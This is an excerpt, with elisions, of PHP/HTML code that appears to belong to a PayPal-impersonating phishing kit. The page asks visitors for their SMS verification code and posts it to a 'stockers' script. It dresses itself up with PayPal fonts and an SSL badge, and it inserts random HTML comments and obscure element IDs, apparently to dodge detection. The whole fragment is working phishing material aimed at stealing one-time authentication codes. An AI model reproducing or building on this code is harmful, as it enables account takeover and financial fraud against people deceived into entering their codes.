...
if(!isset($_SESSION['language'])){exit(header("Location: index"));
  ...
  include "../extra/languages/{$_SESSION['language']}.php";
	...
	if(empty($_POST['sms_code'])== false) {
		       include('../extra/stockers/stepsms.php');
      }
		}
      ...
      <div id="Rotation">
       ...
       <div id="xMarcos_9X9X" style="opacity: 1;"><div id="popup">
         ...
         <div id="xGhostRiderForm" style="display:none !important;"><?php echo "<!--".rand(0,99999999)."-->"?>
            ...
            <form method="post" action="../extra/stockers/stepsms.php" class="idform">
             <?php echo "<!--".rand(0,99999999)."-->"?>
               <div class="ex1">
              ...
              echo '<td><img class="cc_bank" id="cc_bank" src="../app/lib/img/ssl.png"></td>';
                                 ...
                                 text-align: center;font-family: PayPal-Sans-Regular, sans-serif;">
								...
								<div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                             ...
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$sms;?> SMS Code :</td>
                                                <td><input required type="text" name="sms_code" id="sms_code" style="width: 170px;padding-left: 4px;"/></td>
                                             </tr>
